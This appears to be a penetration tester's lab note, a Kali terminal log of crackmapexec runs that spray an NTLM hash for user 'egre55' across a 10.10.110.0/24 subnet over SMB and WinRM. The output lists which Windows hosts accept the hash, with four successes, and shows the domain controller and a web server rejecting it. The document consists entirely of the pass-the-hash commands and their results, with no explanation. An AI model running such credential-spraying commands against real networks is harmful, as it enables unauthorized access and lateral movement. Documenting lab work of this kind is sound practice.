
```powershell
┌──(kali㉿gobots)-[18Apr2024 19:26:29]-[~/SUT]                                                                                                   
└─$ crackmapexec smb 10.10.110.0/24 -u egre55 -H 6f5aaabac58674288d8b66652db4f306                                                                         
SMB         10.10.110.25    445    WS02-ATHENA      [*] Windows 10.0 Build 19041 x64 (name:WS02-ATHENA) (domain:WS02-Athena) (signing:False) (SMBv1:False)
SMB         10.10.110.58    445    SQL01-HERA       [*] Windows Server 2016 Standard 14393 x64 (name:SQL01-HERA) (domain:SQL01-Hera) (signing:False) 
SMB         10.10.110.20    445    WS01-ERIS        [*] Windows 10.0 Build 18362 x64 (name:WS01-ERIS) (domain:WS01-Eris) (signing:False) (SMBv1:False)    
SMB         10.10.110.5     445    SRV01-ARTEMIS    [*] Windows 10.0 Build 17763 x64 (name:SRV01-ARTEMIS) (domain:SRV01-Artemis) (signing:False) 
SMB         10.10.110.3     445    DC01-PHOBOS      [*] Windows 10.0 Build 17763 x64 (name:DC01-PHOBOS) (domain:genesis.local) (signing:True)      
SMB         10.10.110.25    445    WS02-ATHENA      [+] WS02-Athena\egre55:6f5aaabac58674288d8b66652db4f306                                               
SMB         10.10.110.58    445    SQL01-HERA       [+] SQL01-Hera\egre55:6f5aaabac58674288d8b66652db4f306                                                
SMB         10.10.110.20    445    WS01-ERIS        [+] WS01-Eris\egre55:6f5aaabac58674288d8b66652db4f306                                                 
SMB         10.10.110.5     445    SRV01-ARTEMIS    [+] SRV01-Artemis\egre55:6f5aaabac58674288d8b66652db4f306                                             
SMB         10.10.110.3     445    DC01-PHOBOS      [-] genesis.local\egre55:6f5aaabac58674288d8b66652db4f306 STATUS_LOGON_FAILURE                       
SMB         10.10.110.213   445    WEBWIN01-APOLLO  [*] Windows Server 2012 R2 Standard 9600 x64 (name:WEBWIN01-APOLLO) (domain:WEBWIN01-Apollo)
SMB         10.10.110.213   445    WEBWIN01-APOLLO  [-] WEBWIN01-Apollo\egre55:6f5aaabac58674288d8b66652db4f306 STATUS_LOGON_FAILURE                                                                        
┌──(kali㉿gobots)-[18Apr2024 19:26:59]-[~/SUT]                                                                                                                                                              
└─$ crackmapexec winrm 10.10.110.0/24 -u egre55 -H 6f5aaabac58674288d8b66652db4f306                                                                       
SMB         10.10.110.3     5985   DC01-PHOBOS      [*] Windows 10.0 Build 17763 (name:DC01-PHOBOS) (domain:genesis.local)                                
SMB         10.10.110.58    5985   SQL01-HERA       [*] Windows 10.0 Build 14393 (name:SQL01-HERA) (domain:SQL01-Hera)                                    
SMB         10.10.110.25    5985   WS02-ATHENA      [*] Windows 10.0 Build 19041 (name:WS02-ATHENA) (domain:WS02-Athena)                                  
HTTP        10.10.110.3     5985   DC01-PHOBOS      [*] http://10.10.110.3:5985/wsman                                                                     
HTTP        10.10.110.25    5985   WS02-ATHENA      [*] http://10.10.110.25:5985/wsman                                                                    
SMB         10.10.110.5     5985   SRV01-ARTEMIS    [*] Windows 10.0 Build 17763 (name:SRV01-ARTEMIS) (domain:SRV01-Artemis)                              
HTTP        10.10.110.58    5985   SQL01-HERA       [*] http://10.10.110.58:5985/wsman                                                                    
HTTP        10.10.110.5     5985   SRV01-ARTEMIS    [*] http://10.10.110.5:5985/wsman                                                                     
WINRM       10.10.110.3     5985   DC01-PHOBOS      [-] genesis.local\egre55:6f5aaabac58674288d8b66652db4f306                                             
ERROR:pypsrp.wsman:Failed to parse WSManFault message on WinRM error response, raising original WinRMTransportError                                       
WINRM       10.10.110.25    5985   WS02-ATHENA      [-] WS02-Athena\egre55:6f5aaabac58674288d8b66652db4f306 "Bad HTTP response returned from the server. Code: 415, Content: ''"                            
WINRM       10.10.110.58    5985   SQL01-HERA       [-] SQL01-Hera\egre55:6f5aaabac58674288d8b66652db4f306                                                
WINRM       10.10.110.5     5985   SRV01-ARTEMIS    [-] SRV01-Artemis\egre55:6f5aaabac58674288d8b66652db4f306                                             
SMB         10.10.110.213   5985   WEBWIN01-APOLLO  [*] Windows 6.3 Build 9600 (name:WEBWIN01-APOLLO) (domain:WEBWIN01-Apollo)                            
HTTP        10.10.110.213   5985   WEBWIN01-APOLLO  [*] http://10.10.110.213:5985/wsman                                                                   
WINRM       10.10.110.213   5985   WEBWIN01-APOLLO  [-] WEBWIN01-Apollo\egre55:6f5aaabac58674288d8b66652db4f306  
```
![[Pasted image 20240418153050.png]]